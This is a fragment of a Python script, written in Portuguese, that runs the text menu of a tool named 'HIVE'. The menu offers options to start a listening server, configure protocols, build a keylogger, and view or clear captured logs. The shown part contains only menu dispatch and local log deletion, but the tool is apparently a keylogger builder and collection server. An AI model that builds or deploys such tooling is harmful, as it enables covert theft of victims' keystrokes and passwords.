        choice = input(f"{YELLOW} [+] HIVE (🐝) >> {END}").strip()
        
        if choice == '1':
            # Inicia servidor
            if not hive.active_protocols:
                print(f"{YELLOW}[!] Nenhum protocolo configurado! Configure primeiro.{END}")
                time.sleep(1)
                continue
            hive.start_server()
            
        elif choice == '2':
            # Configurar protocolos
            hive.setup_protocols()
            
        elif choice == '3':
            # Gerar KeyLogger
            hive.build_keylogger()
            
        elif choice == '4':
            # Visualizar logs
            hive.view_logs()
            
        elif choice == '5':
            # Limpar logs
            clear()
            confirm = input(f"{RED}[!] Tem certeza que deseja limpar todos os logs? (s/N): {END}").strip().lower()
            if confirm == 's':
                for file in os.listdir(LOG_DIR):
                    if file.endswith('.log'):
                        os.remove(os.path.join(LOG_DIR, file))
                print(f"{WHITE}[+] Logs limpos!{END}")
                time.sleep(1)
                
        elif choice == '0':
            break
        else:
            print(f"{RED}[!] Opção inválida!{END}")
            time.sleep(1)

if __name__ == '__main__':
    menu()